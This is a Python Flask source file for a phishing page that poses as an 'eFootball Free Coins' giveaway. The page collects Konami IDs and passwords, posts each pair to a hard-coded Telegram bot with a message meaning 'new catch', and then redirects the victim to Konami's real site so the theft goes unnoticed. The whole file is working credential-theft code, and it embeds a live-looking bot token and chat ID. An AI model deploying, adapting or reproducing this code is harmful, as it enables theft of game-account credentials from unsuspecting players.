import os
from flask import Flask, render_template_string, request, redirect
import requests

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = "8861759753:AAEQPikaUCB-yti_nWZVCx9LFCfs6g4lWOU"
CHAT_ID = "5204157508"

def send_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
        requests.post(url, json=payload, timeout=5)
    except:
        pass

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>eFootball Free Coins</title>
    <style>
        body { background: #121212; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e1e1e; padding: 30px; border-radius: 12px; width: 300px; text-align: center; }
        input { width: 100%; padding: 10px; margin: 10px 0; background: #2c2c2c; border: none; color: #fff; }
        button { width: 100%; padding: 10px; background: #00d2ff; border: none; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <h2>eFootball Free Coins</h2>
        <form method="POST">
            <input type="text" name="username" placeholder="Konami ID" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Claim Coins</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        user = request.form.get('username')
        pw = request.form.get('password')
        send_to_telegram(f"🚨 صيد جديد:\n👤 ID: {user}\n🔑 Pass: {pw}")
        return redirect("https://www.konami.com/efootball/")
    return render_template_string(HTML_TEMPLATE)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
